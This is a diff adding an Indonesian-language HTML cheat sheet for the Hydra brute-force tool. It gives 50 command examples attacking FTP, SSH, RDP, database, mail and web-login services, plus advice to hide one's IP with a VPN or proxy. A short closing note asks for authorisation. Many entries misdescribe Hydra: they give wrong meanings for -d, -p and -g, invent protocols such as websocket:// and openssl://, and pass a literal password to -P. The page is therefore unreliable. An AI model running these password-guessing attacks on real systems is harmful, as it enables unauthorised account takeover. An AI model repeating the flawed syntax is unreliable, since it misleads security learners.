@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheat Sheet Hydra - Nofrinto Flory - Syber9</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #121212;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        h1, h2 {
+            color: #00ff00;
+            text-align: center;
+        }
+        .container {
+            margin-top: 20px;
+            max-width: 800px;
+        }
+        pre {
+            background-color: #1e1e1e;
+            padding: 10px;
+            border: 1px solid #00ff00;
+            overflow-x: auto;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: #00ff00;
+        }
+        .navbar {
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 1px solid #00ff00;
+        }
+        .navbar-nav .nav-link {
+            color: #00ff00 !important;
+        }
+        .navbar-nav .nav-link:hover {
+            background-color: #262626;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img style="border-radius: 100%;" src="./image/bg1.webp" alt="Nofrinto Flory" width="30" height="30">
+                Hydra 
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="dashboard.html">Dashboard</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#pengantar">Pengantar</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#instalasi">Instalasi</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#penggunaan">Penggunaan Dasar</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#contoh">50 Contoh Penggunaan</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#catatan">Catatan Penting</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1>Cheat Sheet Hydra</h1>
+
+        <h2 id="pengantar">Pengenalan</h2>
+        <pre>
+Hydra adalah alat untuk melakukan serangan brute-force terhadap berbagai layanan dengan banyak protokol.
+        </pre>
+
+        <h2 id="instalasi">Instalasi</h2>
+        <pre>
+# Untuk menginstal Hydra di sistem berbasis Debian/Ubuntu:
+sudo apt-get install hydra
+        </pre>
+
+        <h2 id="penggunaan">Penggunaan Dasar</h2>
+        <pre>
+# Untuk memulai serangan brute-force pada FTP:
+hydra -l username -P /path/to/passwords.txt ftp://target_ip
+        </pre>
+
+        <h2 id="contoh">50 Contoh Penggunaan Hydra</h2>
+
+        <h3>1. Serangan Brute-force FTP</h3>
+        <pre>
+hydra -l admin -P passwords.txt ftp://192.168.1.1
+        </pre>
+
+        <h3>2. Serangan Brute-force SSH</h3>
+        <pre>
+hydra -l root -P passwords.txt ssh://192.168.1.1
+        </pre>
+
+        <h3>3. Serangan Brute-force HTTP Form</h3>
+        <pre>
+hydra -l admin -P passwords.txt http-form://192.168.1.1/login.php:username=^USER^&password=^PASS^:F=incorrect
+        </pre>
+
+        <h3>4. Menggunakan file username</h3>
+        <pre>
+hydra -L usernames.txt -P passwords.txt ftp://192.168.1.1
+        </pre>
+
+        <h3>5. Serangan Brute-force terhadap MySQL</h3>
+        <pre>
+hydra -l root -P passwords.txt mysql://192.168.1.1
+        </pre>
+
+        <h3>6. Serangan Brute-force terhadap Telnet</h3>
+        <pre>
+hydra -l admin -P passwords.txt telnet://192.168.1.1
+        </pre>
+
+        <h3>7. Serangan Brute-force terhadap POP3</h3>
+        <pre>
+hydra -l user -P passwords.txt pop3://192.168.1.1
+        </pre>
+
+        <h3>8. Serangan Brute-force terhadap IMAP</h3>
+        <pre>
+hydra -l user -P passwords.txt imap://192.168.1.1
+        </pre>
+
+        <h3>9. Serangan Brute-force terhadap RDP</h3>
+        <pre>
+hydra -l user -P passwords.txt rdp://192.168.1.1
+        </pre>
+
+        <h3>10. Menggunakan opsi -t untuk menentukan jumlah thread</h3>
+        <pre>
+hydra -l admin -P passwords.txt -t 4 ftp://192.168.1.1
+        </pre>
+
+        <h3>11. Menggunakan opsi -w untuk menentukan waktu tunggu</h3>
+        <pre>
+hydra -l admin -P passwords.txt -w 5 ftp://192.168.1.1
+        </pre>
+
+        <h3>12. Menentukan protokol yang berbeda</h3>
+        <pre>
+hydra -l admin -P passwords.txt http://192.168.1.1
+        </pre>
+
+        <h3>13. Serangan Brute-force terhadap SQL</h3>
+        <pre>
+hydra -l root -P passwords.txt sql://192.168.1.1
+        </pre>
+
+        <h3>14. Serangan Brute-force terhadap LDAP</h3>
+        <pre>
+hydra -l user -P passwords.txt ldap://192.168.1.1
+        </pre>
+
+        <h3>15. Menentukan port yang digunakan</h3>
+        <pre>
+hydra -l admin -P passwords.txt -p 8080 http://192.168.1.1
+        </pre>
+
+        <h3>16. Menggunakan opsi -f untuk berhenti setelah menemukan password</h3>
+        <pre>
+hydra -l admin -P passwords.txt -f ftp://192.168.1.1
+        </pre>
+
+        <h3>17. Menggunakan proxy untuk melakukan serangan</h3>
+        <pre>
+hydra -l admin -P passwords.txt -p http://127.0.0.1:8080 ftp://192.168.1.1
+        </pre>
+
+        <h3>18. Menggunakan format data kustom untuk HTTP</h3>
+        <pre>
+hydra -l admin -P passwords.txt http-form://192.168.1.1/login.php:username=^USER^&password=^PASS^:F=incorrect
+        </pre>
+
+        <h3>19. Menggunakan opsi -V untuk verbose</h3>
+        <pre>
+hydra -l admin -P passwords.txt -V ftp://192.168.1.1
+        </pre>
+
+        <h3>20. Menentukan waktu tunggu (timeout)</h3>
+        <pre>
+hydra -l admin -P passwords.txt -t 4 -w 5 ftp://192.168.1.1
+        </pre>
+
+        <h3>21. Menentukan user-agent kustom untuk serangan HTTP</h3>
+        <pre>
+hydra -l admin -P passwords.txt -H "User-Agent: Mozilla/5.0" http://192.168.1.1
+        </pre>
+
+        <h3>22. Menggunakan file password secara langsung</h3>
+        <pre>
+hydra -l admin -P /path/to/passwords.txt ftp://192.168.1.1
+        </pre>
+
+        <h3>23. Menentukan direktori untuk menyimpan hasil</h3>
+        <pre>
+hydra -l admin -P passwords.txt -o hasil.txt ftp://192.168.1.1
+        </pre>
+
+        <h3>24. Menggunakan opsi -e untuk menentukan metode percobaan password</h3>
+        <pre>
+hydra -l admin -P passwords.txt -e ns ftp://192.168.1.1
+        </pre>
+
+        <h3>25. Menggunakan opsi -d untuk tidak menunjukkan password yang ditemukan</h3>
+        <pre>
+hydra -l admin -P passwords.txt -d ftp://192.168.1.1
+        </pre>
+
+        <h3>26. Menggunakan hash untuk password</h3>
+        <pre>
+hydra -l admin -P hash.txt -m md5 ftp://192.168.1.1
+        </pre>
+
+        <h3>27. Menggunakan opsi -L untuk file username dengan banyak opsi</h3>
+        <pre>
+hydra -L usernames.txt -P passwords.txt ftp://192.168.1.1
+        </pre>
+
+        <h3>28. Menentukan file hasil untuk lebih banyak output</h3>
+        <pre>
+hydra -l admin -P passwords.txt -o hasil_hydra.txt ftp://192.168.1.1
+        </pre>
+
+        <h3>29. Menggunakan metode serangan spesifik</h3>
+        <pre>
+hydra -l admin -P passwords.txt -s 8080 http-get://192.168.1.1/login.php
+        </pre>
+
+        <h3>30. Serangan pada WebSocket</h3>
+        <pre>
+hydra -l admin -P passwords.txt websocket://192.168.1.1
+        </pre>
+
+        <h3>31. Menggunakan opsi -g untuk menargetkan subdomain</h3>
+        <pre>
+hydra -l admin -P passwords.txt -g subdomain.target.com ftp://192.168.1.1
+        </pre>
+
+        <h3>32. Menggunakan -d untuk menghindari serangan ke host yang sama</h3>
+        <pre>
+hydra -l admin -P passwords.txt -d ftp://192.168.1.1
+        </pre>
+
+        <h3>33. Menentukan pengulangan untuk serangan</h3>
+        <pre>
+hydra -l admin -P passwords.txt -R ftp://192.168.1.1
+        </pre>
+
+        <h3>34. Menyimpan hasil ke dalam file JSON</h3>
+        <pre>
+hydra -l admin -P passwords.txt -o hasil.json ftp://192.168.1.1
+        </pre>
+
+        <h3>35. Menggunakan --help untuk bantuan</h3>
+        <pre>
+hydra --help
+        </pre>
+
+        <h3>36. Menggunakan GUI untuk Hydra</h3>
+        <pre>
+hydra-gui
+        </pre>
+
+        <h3>37. Menggunakan VPN untuk menyembunyikan IP</h3>
+        <pre>
+# Hubungkan ke VPN sebelum menjalankan Hydra
+        </pre>
+
+        <h3>38. Menggunakan port yang tidak biasa</h3>
+        <pre>
+hydra -l admin -P passwords.txt -p 8888 ftp://192.168.1.1
+        </pre>
+
+        <h3>39. Menggunakan karakter spesial dalam password</h3>
+        <pre>
+hydra -l admin -P "p@ssw0rd!" ftp://192.168.1.1
+        </pre>
+
+        <h3>40. Menggunakan proxy dengan SOCKS5</h3>
+        <pre>
+hydra -l admin -P passwords.txt -p socks5://127.0.0.1:1080 ftp://192.168.1.1
+        </pre>
+
+        <h3>41. Menggunakan variasi pada password</h3>
+        <pre>
+hydra -l admin -P passwords.txt -e ns -e a ftp://192.168.1.1
+        </pre>
+
+        <h3>42. Menentukan timeout koneksi</h3>
+        <pre>
+hydra -l admin -P passwords.txt -t 4 -w 5 -t 3 ftp://192.168.1.1
+        </pre>
+
+        <h3>43. Menggunakan OpenSSL untuk enkripsi</h3>
+        <pre>
+hydra -l admin -P passwords.txt openssl://192.168.1.1
+        </pre>
+
+        <h3>44. Menentukan delay antar percobaan</h3>
+        <pre>
+hydra -l admin -P passwords.txt -d 5 ftp://192.168.1.1
+        </pre>
+
+        <h3>45. Menyimpan hasil ke dalam CSV</h3>
+        <pre>
+hydra -l admin -P passwords.txt -o hasil.csv ftp://192.168.1.1
+        </pre>
+
+        <h3>46. Menggunakan URL dinamis</h3>
+        <pre>
+hydra -l admin -P passwords.txt http://192.168.1.1/login.php?dynamic_param=value
+        </pre>
+
+        <h3>47. Serangan terhadap API dengan token</h3>
+        <pre>
+hydra -l admin -P passwords.txt http-form://192.168.1.1/api/login:username=^USER^&password=^PASS^:F=incorrect
+        </pre>
+
+        <h3>48. Menggunakan -d untuk tidak menampilkan password</h3>
+        <pre>
+hydra -l admin -P passwords.txt -d ftp://192.168.1.1
+        </pre>
+
+        <h3>49. Melakukan brute-force terhadap MongoDB</h3>
+        <pre>
+hydra -l admin -P passwords.txt mongodb://192.168.1.1
+        </pre>
+
+        <h3>50. Menggunakan Hydra dalam mode headless</h3>
+        <pre>
+hydra -l admin -P passwords.txt -f -o hasil.txt ftp://192.168.1.1
+        </pre>
+
+        <h2 id="catatan">Catatan Penting</h2>
+        <pre>
+- Gunakan Hydra dengan izin yang tepat pada server yang Anda targetkan.
+- Hasil dari Hydra harus digunakan untuk tujuan pengujian keamanan yang sah.
+        </pre>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2024 Nofrinto Flory - Cheat Sheet Hydra</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
